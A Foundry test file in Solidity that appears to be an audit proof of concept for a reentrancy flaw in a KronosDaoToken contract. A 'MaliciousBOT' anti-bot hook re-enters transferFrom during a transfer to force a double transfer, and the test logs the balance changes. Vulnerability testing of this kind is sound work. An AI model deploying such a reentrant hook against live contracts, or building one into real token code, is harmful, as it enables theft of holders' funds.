// SPDX-License-Identifier: MIT
pragma solidity 0.7.5;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/KronosDaoToken.sol";

contract AtomicityTest is Test {
    KronosDaoToken token;
    MaliciousBOT maliciousBOT;
    
    address owner = address(this);
    address attacker = address(0x1);
    address victim = address(0x2);

    function setUp() public {
        // Deploy malicious anti-bot contract
        maliciousBOT = new MaliciousBOT();
        
        // Deploy token with malicious anti-bot
        token = new KronosDaoToken(address(maliciousBOT));
        
        // Set up environment
        maliciousBOT.setToken(address(token));
        token.setVault(owner);  // Set vault to owner
        token.mint(attacker, 1000 ether);
        
        // Attacker approves maliciousBOT to spend tokens
        vm.prank(attacker);
        token.approve(address(maliciousBOT), type(uint256).max);
        
        token.setEnableAntiBot(true); // Enable anti-bot checks
    }

    function testAtomicityViolation() public {
        // Before attack: record initial balances
        console.log("--- BEFORE-Trigger Balances ---");
        uint256 initialAttackerBalance = token.balanceOf(attacker);
        uint256 initialVictimBalance = token.balanceOf(victim);
        console.log("Attacker balance:", initialAttackerBalance);
        console.log("Victim balance:", initialVictimBalance);

        console.log("--- Trigger Transfer ---");
        // Perform the attack transaction (critical operation)
        vm.prank(attacker);
        token.transfer(victim, 100 ether);

        // After attack: record final balances
        console.log("--- AFTER-Trigger Balances ---");
        uint256 finalAttackerBalance = token.balanceOf(attacker);
        uint256 finalVictimBalance = token.balanceOf(victim);
        console.log("Attacker balance:", finalAttackerBalance);
        console.log("Victim balance:", finalVictimBalance);

        // Differential comparison
        uint256 attackerChange = initialAttackerBalance - finalAttackerBalance;
        uint256 victimChange = finalVictimBalance - initialVictimBalance;
        console.log("Attacker balance change: %d vs normal expected change: 100", attackerChange);
        console.log("Victim balance change: %d vs normal expected change: 100", victimChange);

        // Vulnerability verdict
        if (attackerChange == 200 ether) {
            console.log("Verdict: Double transfer detected - 200 ether transferred instead of 100");
            console.log("Vulnerability Exists: atomicity violation allows double transfer through reentrant anti-bot hook");
        } else {
            console.log("Verdict: Normal transfer occurred - no double transfer detected");
            console.log("Vulnerability not Exist: Anti-bot hook did not cause double transfer");
        }
    }
}

contract MaliciousBOT {
    KronosDaoToken public token;
    bool private isExecuting = false;
    
    function setToken(address _token) public {
        token = KronosDaoToken(_token);
    }
    
    // Required by KronosDaoToken constructor
    function setTokenOwner(address) external {
        // No operation needed
    }
    
    function onPreTransferCheck(address from, address to, uint256 amount) external {
        if (!isExecuting) {
            isExecuting = true;
            // Exploit the atomicity violation by initiating a second transfer
            token.transferFrom(from, to, amount);
            isExecuting = false;
        }
    }
}